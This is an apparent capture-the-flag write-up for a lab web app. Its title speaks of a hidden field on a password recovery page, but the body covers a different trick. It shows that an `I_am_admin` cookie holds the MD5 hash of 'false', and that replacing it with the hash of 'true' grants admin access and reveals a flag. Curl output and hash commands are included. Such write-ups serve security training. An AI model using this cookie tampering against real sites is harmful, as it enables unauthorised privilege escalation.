# Hidden field on pass recover page

## Exploitation

When checking the cookies of the website, we can see a cookie named `I_am_admin`, wich contain a hash

```
curl -I 'http://192.168.1.48/'   
HTTP/1.1 200 OK
Server: nginx/1.8.0
Date: Tue, 22 Sep 2020 13:31:47 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1ubuntu3.19
Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Tue, 22-Sep-2020 14:31:47 GMT
```

Try to crack the hash with crackstation.net

It appears to be a md5 hash for the string `false`

Maybe we can hash the string `true` to be admin?

```
$ echo -n 'true' | md5sum           
b326b5062b2f0e69046810717534cb09  -
```

Try to put this hash on the cookie instead of the `false`

We got the flag!

Script it

```
$ ./exploit.py 
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script>
```




